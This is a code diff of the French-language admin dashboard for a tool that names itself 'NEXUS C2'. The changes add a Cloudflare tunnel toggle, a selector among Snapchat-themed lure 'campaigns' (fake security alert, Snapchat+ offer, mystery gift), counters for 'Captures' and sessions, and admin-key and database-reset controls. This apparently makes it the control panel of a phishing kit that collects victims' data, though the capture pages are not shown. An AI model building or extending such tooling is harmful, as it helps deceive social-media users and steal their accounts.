@@ -353,10 +353,41 @@ tr:hover{background:var(--surface)}
             <h2>Settings</h2>
             <p class="sub">Configuration du framework</p>
             <div class="setting-grid">
-                <div class="settings-card"><h4>Serveur</h4><label>Port</label><input class="input-dark" id="srv-port" value="8080"><label>Admin Key</label><input class="input-dark" id="srv-key" value="••••••••" type="password"><div><button class="btn btn-primary btn-sm" id="srv-apply">Appliquer</button><button class="btn btn-ghost btn-sm" id="srv-copy">Copier</button></div></div>
-                <div class="settings-card"><h4>Telegram</h4><label>Token</label><input class="input-dark" id="tg-token" placeholder="Bot token"><label>Chat ID</label><input class="input-dark" id="tg-chat" placeholder="Chat ID"><button class="btn btn-primary btn-sm" id="tg-test">Tester</button></div>
-                <div class="settings-card"><h4>Base de données</h4><div class="row"><span>Captures</span><span class="val" id="db-captures">0</span></div><div class="row"><span>Votes</span><span class="val" id="db-votes">0</span></div><div class="row"><span>Sessions</span><span class="val" id="db-sessions">0</span></div><button class="btn btn-ghost btn-sm" style="margin-top:8px;color:var(--accent-red)">Réinitialiser</button></div>
-                <div class="settings-card"><h4>Réseau</h4><div class="row"><span>Statut</span><span class="val"><span style="color:#00FF99">●</span> Online</span></div><div class="row"><span>Host</span><span class="val">127.0.0.1</span></div><div class="row"><span>Domaine</span><span class="val">Local</span></div><button class="btn btn-ghost btn-sm" style="margin-top:8px">Configurer domaine</button></div>
+                <div class="settings-card"><h4>Serveur</h4>
+                <div class="row"><span>Statut</span><span class="val" style="color:#00FF99">● En ligne</span></div>
+                <div class="row"><span>Port</span><span class="val" id="srv-port-display">8080</span></div>
+                <div class="row"><span>Admin Key</span><span class="val" id="srv-key-display" style="cursor:pointer" title="Cliquer pour copier">••••••••••••</span></div>
+                <div style="margin-top:8px"><button class="btn btn-ghost btn-sm" id="srv-copy-key" style="width:100%">📋 Copier la clé</button></div>
+            </div>
+            <div class="settings-card"><h4>Tunnel Cloudflare</h4>
+                <button class="btn btn-primary btn-sm" id="tunnel-btn" style="width:100%;margin-bottom:8px">🔌 Démarrer le tunnel</button>
+                <div class="row"><span>Statut</span><span class="val" id="tunnel-url">-</span></div>
+            </div>
+            <div class="settings-card"><h4>Campagne active</h4>
+                <select class="input-dark" id="campaign-select" style="margin-bottom:8px">
+                    <option value="classement">🏆 Classement Secret</option>
+                    <option value="securite">🔐 Alerte Sécurité</option>
+                    <option value="snapchat_plus">🎁 Snapchat+</option>
+                    <option value="cadeau">🎀 Cadeau Mystère</option>
+                </select>
+                <button class="btn btn-primary btn-sm" id="campaign-apply" style="width:100%">✅ Appliquer la campagne</button>
+                <div class="row" style="margin-top:8px"><span>Lien actif</span><span class="val" id="campaign-url">/scenario/classement</span></div>
+            </div>
+            <div class="settings-card"><h4>Base de données</h4>
+                <div class="row"><span>Captures</span><span class="val" id="db-captures">0</span></div>
+                <div class="row"><span>Votes</span><span class="val" id="db-votes">0</span></div>
+                <div class="row"><span>Sessions</span><span class="val" id="db-sessions">0</span></div>
+                <button class="btn btn-ghost btn-sm" id="db-reset-btn" style="margin-top:8px;color:var(--accent-red);width:100%">🗑️ Réinitialiser la base</button>
+            </div>
+            <div class="settings-card"><h4>À propos</h4>
+                <div style="font-size:12px;line-height:1.8">
+                    <span style="color:var(--text-secondary)">Version :</span> 3.0<br>
+                    <span style="color:var(--text-secondary)">Auteur :</span> Famoussa<br>
+                    <span style="color:var(--text-secondary)">Framework :</span> NEXUS C2<br>
+                    <span style="color:var(--text-secondary)">Stack :</span> Flask + SQLite<br>
+                    <span style="color:var(--text-secondary)">License :</span> MIT
+                </div>
+            </div>
             </div>
         </div>
 
@@ -379,7 +410,7 @@ document.querySelectorAll('.nav-item').forEach(item => {
         if(panel === 'overview') loadOverview();
         if(panel === 'live') loadLive();
         if(panel === 'targets') loadTargets();
-        if(panel === 'campaigns') loadCampaigns();
+        if(panel === 'campaigns'){ loadCampaigns(); loadActiveCampaign(); }
         if(panel === 'vote') loadVote();
         if(panel === 'logs') loadLogs();
     });
@@ -658,6 +689,7 @@ document.getElementById('srv-copy')?.addEventListener('click', function(){
 // ── Init ──
 loadOverview();
 loadLive();
+loadActiveCampaign();
 
 // Poll overview every 30s
 setInterval(loadOverview, 30000);
@@ -791,35 +823,72 @@ function activateScenario(id){
 }
 
 // ── Tunnel Control ──
-function startTunnel(){
-    var btn = document.getElementById('tunnel-btn');
-    btn.textContent = '✦ Demarrage...';
-    btn.disabled = true;
-    fetch('/api/tunnel/start', {method:'POST'}).then(function(r){return r.json()}).then(function(d){
-        btn.textContent = d.ok ? '✅ Tunnel actif' : '❌ Erreur';
-        setTimeout(function(){btn.textContent = '🔄 Arreter le tunnel'; btn.disabled = false;}, 2000);
-        if(d.ok) document.getElementById('tunnel-url').textContent = 'Demarrage...';
-    });
-}
-function stopTunnel(){
-    fetch('/api/tunnel/stop', {method:'POST'}).then(function(){
-        document.getElementById('tunnel-btn').textContent = '🔌 Demarrer le tunnel';
-        document.getElementById('tunnel-url').textContent = '-';
-    });
-}
-// Add tunnel UI to settings
-setTimeout(function(){
-    var settingsCards = document.querySelectorAll('.settings-card');
-    if(settingsCards.length > 2){
-        // Add tunnel card after settings
-        var tunnelCard = document.createElement('div');
-        tunnelCard.className = 'settings-card';
-        tunnelCard.innerHTML = '<h4>Tunnel Cloudflare</h4>'+
-            '<button class="btn btn-primary btn-sm" id="tunnel-btn" onclick="startTunnel()" style="width:100%;margin-bottom:6px">🔌 Demarrer le tunnel</button>'+
-            '<div class="row"><span>Statut</span><span class="val" id="tunnel-url">-</span></div>';
-        settingsCards[2].parentNode.appendChild(tunnelCard);
+document.getElementById('tunnel-btn')?.addEventListener('click', function(){
+    var btn = this;
+    if(btn.textContent.includes('Arrêter')){
+        fetch('/api/tunnel/stop', {method:'POST'}).then(function(){
+            btn.textContent = '🔌 Démarrer le tunnel';
+            document.getElementById('tunnel-url').textContent = '-';
+        });
+    } else {
+        btn.textContent = '✦ Démarrage...';
+        btn.disabled = true;
+        fetch('/api/tunnel/start', {method:'POST'}).then(function(r){return r.json()}).then(function(d){
+            if(d.ok){
+                btn.textContent = '🔄 Arrêter le tunnel';
+                document.getElementById('tunnel-url').textContent = '✅ Tunnel actif';
+            } else {
+                btn.textContent = '❌ cloudflared.exe introuvable';
+                setTimeout(function(){btn.textContent = '🔌 Démarrer le tunnel'; btn.disabled = false;}, 3000);
+            }
+        });
     }
-}, 100);
+});
+
+// ── Campaign Selector ──
+function loadActiveCampaign(){
+    fetch('/api/campaign/active').then(function(r){return r.json()}).then(function(d){
+        var sel = document.getElementById('campaign-select');
+        if(sel && d.active) sel.value = d.active;
+        if(d.active) document.getElementById('campaign-url').textContent = '/scenario/'+d.active;
+    });
+}
+document.getElementById('campaign-apply')?.addEventListener('click', function(){
+    var sel = document.getElementById('campaign-select');
+    if(!sel) return;
+    var val = sel.value;
+    fetch('/api/campaign/active', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({scenario:val})})
+    .then(function(){ 
+        document.getElementById('campaign-url').textContent = '/scenario/'+val;
+        loadCampaigns();
+        loadActiveCampaign();
+    });
+});
+
+// ── Copy Admin Key ──
+document.getElementById('srv-copy-key')?.addEventListener('click', function(){
+    var key = '{{ admin_key or "non-disponible" }}';
+    navigator.clipboard.writeText(key).then(function(){
+        this.textContent = '✅ Copié : '+key.slice(0,8)+'...';
+        setTimeout(function(){document.getElementById('srv-copy-key').textContent = '📋 Copier la clé';}, 2000);
+    }.bind(this));
+});
+
+// ── Reset DB ──
+document.getElementById('db-reset-btn')?.addEventListener('click', function(){
+    if(!confirm('⚠️ RÉINITIALISER toute la base de données ?\nCette action est irréversible.')) return;
+    this.textContent = '🗑️ Suppression...';
+    this.disabled = true;
+    fetch('/reset?key=' + encodeURIComponent('{{ admin_key or "" }}'), {method:'POST'})
+    .then(function(){ return fetch('/api/dbcheck'); })
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+        alert('✅ Base réinitialisée. Captures: '+d.total_captures+', Logs: '+d.total_logs);
+        loadOverview();
+        this.textContent = '🗑️ Réinitialiser la base';
+        this.disabled = false;
+    }.bind(this));
+});
 
 // ── QR Code inline ──
 document.getElementById('qr-btn')?.addEventListener('click', function(){
